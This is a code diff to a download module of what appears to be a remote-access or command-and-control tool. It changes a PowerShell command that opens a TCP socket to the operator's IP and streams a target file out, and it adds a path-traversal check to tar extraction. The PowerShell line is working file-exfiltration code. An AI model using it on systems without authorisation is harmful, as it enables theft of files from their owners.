@@ -122,7 +122,7 @@ class DownloadModule(KoiModule):
                     ps_cmd = (
                         f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                         f"$_s=$_c.GetStream();"
-                        f"$_f=[IO.File]::OpenRead((Get-Item '{ps_path}').FullName);"
+                        f"$_f=[IO.File]::OpenRead((Get-Item -LiteralPath '{ps_path}').FullName);"
                         f"$_b=New-Object byte[] 65536;"
                         f"while(($_n=$_f.Read($_b,0,$_b.Length))-gt 0){{$_s.Write($_b,0,$_n)}};"
                         f"$_f.Close();$_s.Flush();$_c.Close()"
@@ -229,7 +229,13 @@ class DownloadModule(KoiModule):
                             try:
                                 tar.extractall(path=local_out, filter="data")
                             except TypeError:
-                                tar.extractall(path=local_out)
+                                base = os.path.abspath(local_out)
+                                safe = []
+                                for m in tar.getmembers():
+                                    dest = os.path.abspath(os.path.join(local_out, m.name))
+                                    if dest == base or dest.startswith(base + os.sep):
+                                        safe.append(m)
+                                tar.extractall(path=local_out, members=safe)
                             file_count = sum(1 for m in tar.getmembers() if m.isfile())
                     else:
                         with zipfile.ZipFile(io.BytesIO(raw)) as zf:
